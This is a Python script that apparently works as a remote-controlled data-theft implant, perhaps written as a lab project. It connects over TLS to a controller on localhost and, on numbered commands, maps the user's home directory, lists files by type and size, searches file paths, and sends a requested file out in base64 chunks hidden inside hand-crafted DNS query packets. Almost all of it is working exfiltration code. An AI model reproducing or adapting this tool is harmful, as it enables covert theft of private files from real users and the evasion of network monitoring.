#!/usr/bin/env python3

import os
import sys
import zlib
import socket
import ssl
from time import sleep
from pathlib import Path
from base64 import b64encode

READ_BINARY = "rb"
WRITE_BINARY = "wb"
MAX_PAYLOAD_SIZE = "76"
INITIATION_STRING = "INIT_445"
DELIMITER = "::"
NULL = "\x00"
DATA_TERMINATOR = "\xcc\xcc\xcc\xcc\xff\xff\xff\xff"

def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01):
	"""
	Will exfiltrate data over DNS to the known DNS server (i.e. host).
	I just want to say on an optimistic note that byte, bit, hex and char manipulation
	is Python are terrible.
	:param host: DNS server IP
	:param path_to_file: Path to file to exfiltrate
	:param port: UDP port to direct to. Default is 53.
	:param max_packet_size: Max packet size. Default is 128.
	:param time_delay: Time delay between packets. Default is 0.01 secs.
	:return:Boolean
	"""

	def build_dns(host_to_resolve):
		"""
		Building a standard DNS query packet from raw.
		DNS is hostile to working with. Especially in python.
		The Null constant is only used once since in the rest
		it's not a Null but rather a bitwise 0. Only after the
		DNS name to query it is a NULL.
		:param host_to_resolve: Exactly what is sounds like
		:return: The DNS Query
		"""

		res = host_to_resolve.split(".")
		dns = ""
		dns += "\x04\x06"		# Transaction ID
		dns += "\x01\x00"		# Flags - Standard Query
		dns += "\x00\x01"		# Queries
		dns += "\x00\x00"		# Responses
		dns += "\x00\x00"		# Authoroties
		dns += "\x00\x00"		# Additional
		for part in res:
			dns += chr(len(part)) + part
		dns += NULL			    # Null termination. Here it's really NULL for string termination
		dns += "\x00\x01"		# A (Host Addr), \x00\x1c for AAAA (IPv6)
		dns += "\x00\x01"		# IN Class
		return dns

	# Read file
	try:
		fh = open(path_to_file, READ_BINARY)
		exfil_me = fh.read()
		fh.close()
	except:
		sys.stderr.write("Problem with reading file. ")
		return -1
	
	checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification
	# Try and check if you can send data
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error as msg:
		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		return -1

	# Initiation packet:
	dns_request = build_dns(host)                                               # Build the DNS Query
	head, tail = os.path.split(path_to_file)                                       # Get filename
	dns_request += (INITIATION_STRING + tail + DELIMITER + str(checksum) + NULL )           # Extra data goes here
	dns_request = dns_request.encode()
	addr = (host, port)             # build address to send to
	s.sendto(dns_request, addr)

	# Sending actual file:
	chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
	for chunk in chunks:
		dns_request = build_dns(host)
		chunk = b64encode(chunk).decode()
		dns_request += chunk + DATA_TERMINATOR
		dns_request = dns_request.encode()
		s.sendto(dns_request, addr)
		sleep(time_delay)

	# Send termination packet:
	dns_request = build_dns(host)
	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
	dns_request = dns_request.encode()
	s.sendto(dns_request, addr)
	
	return 0

def tree(dir_path: Path, prefix: str=''):
    """A recursive generator, given a directory Path object
    will yield a visual tree structure line by line
    with each line prefixed by the same characters
    """ 

    # prefix components:
    space =  '    '
    branch = '│   '
    # pointers:
    tee =    '├── '
    last =   '└── '

    try:   
        contents = [file for file in dir_path.iterdir() if not file.name.startswith(".")]
        # contents each get pointers that are ├── with a final └── :
        pointers = [tee] * (len(contents) - 1) + [last]
        for pointer, path in zip(pointers, contents):
            yield prefix + pointer + path.name
            if path.is_dir(): # extend the prefix and recurse:
                extension = branch if pointer == tee else space 
                # i.e. space because last, └── , above so no more |
                yield from tree(path, prefix=prefix+extension)
    except PermissionError: # skip folders with no reading permission
        pass

def fileinfo(dir_path: Path, prefix: str=''):
    try:
        file = [file for file in dir_path.iterdir() if not file.name.startswith(".")]
        for path in file:
            yield path
            if path.is_dir(): # extend the prefix and recurse:
                yield from fileinfo(path, prefix=prefix)
    except PermissionError: # skip folders with no reading permission
        pass


context = ssl.create_default_context()
context.load_verify_locations('./cert/cert.pem')
conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname="localhost")
conn.connect(("localhost", 65432))

data = conn.recv(1024)
i = int.from_bytes(data, "big")
while i != 6:
    print("Datatransfer starting")
    if i == 1:
        for line in tree(Path.home()):
            conn.sendall((line + "\n").encode())
        conn.sendall(("!").encode())    #termination
    elif i >= 2:
        files_dict_size = {}
        files_dict_type = {}
        a = i
        for i in fileinfo(Path.home()):
            if i.is_file():
                files_dict_size.update({i.joinpath(): i.stat().st_size}) # get all files and write path and size into dictionary
                files_dict_type.update({i.joinpath(): i.suffix}) # get all files and write path and type into dictionary

        ordered_size = {k: v for k, v in sorted(files_dict_size.items(), key=lambda item: item[1], reverse=True)} #sort dict by size
        ordered_type = {k: v for k, v in sorted(files_dict_type.items(), key=lambda item: item[1], reverse=True)} #sort dict by type

        i = a

        if i == 2:
            for x, y in ordered_type.items():
                if y != "":
                    conn.sendall((str(x) + ", " + str(y) + "\n").encode())
            conn.sendall(("!").encode())    #termination

        if i == 3:
            for x, y in ordered_size.items():
                if y > 50000: # only files with a size over 50000
                    conn.sendall((str(x) + ", " + str(y) + "\n").encode())
            conn.sendall(("!").encode())    #termination

        if i == 4:
            ss = (conn.recv(1024)).decode()
            for x, y in files_dict_type.items():
                if ss in str(x):
                    conn.sendall((str(x) + "\n").encode())
            conn.sendall(("!").encode())    #termination

        if i == 5:
            file = (conn.recv(1024)).decode()
            dns_exfil(  host="localhost",
                        path_to_file=file
                        # port[53], max_packet_size=[128], time_delay=[0.01]
                        )
            sleep(10)

    data = conn.recv(1024)
    i = int.from_bytes(data, "big")

endmessage = conn.recv(1024)
print(endmessage.decode())